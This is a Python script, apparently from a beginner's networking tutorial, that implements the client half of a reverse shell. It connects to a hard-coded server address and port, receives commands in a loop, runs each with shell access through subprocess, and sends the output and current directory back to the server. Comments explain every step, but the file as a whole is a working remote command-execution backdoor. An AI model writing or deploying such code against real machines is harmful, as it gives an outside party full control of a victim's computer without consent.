# function of the client file are:
# try and connect to our server
# wait for our instruction
# recevies the instruction and run  thm
# take the result and send them back to the server

import socket
import os
import subprocess  # subprocess are the process which exists on the windows computer system

s=socket.socket()
host='192.168.1.30' # ip address of the server , so here i will be using my local host ip address
port=9999 # it should be same as of the server

# now its time to bind it 
s.connect((host,port))

# create an infine loop
while True:
    #to recive data from server we need to create a variable
    data=s.recv(1024) # 1024 is the amount of chunks in which data is going to be receive 

# now we will do some kind of data checks
    if data[:2].decode("utf-8")=='cd': # :2 means that in sever when we encoded the byte (1024),"utf-8"
# above line is doing the work like -> first it will decode the byte to string and then it took the
#first 2 characters of the data that we receive then checks whether the first 2 characters are cd or not
        os.chdir(data[3:].decode("utf-8")) # this line means when we type in cmd like cd (directory)
    
    if len(data)>0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE, stderr=subprocess.PIPE) 
        #Popen will open something like terminal and excute the stament, 
        #shell=true give us the access to the shell command 
        #after this we have to write some parameters for  standard input and output 

        # now we have to send the output back to the server
        # so there are 2 type of output that we can send
        # first is of byte character 
        #second is of string type

        output_byte=cmd.stdout.read()+cmd.stderr.read()
        output_str=str(output_byte,"utf-8")
        
        currentWD=os.getcwd()+">" 
        s.send(str.encode(output_str + currentWD))

        print(output_str)


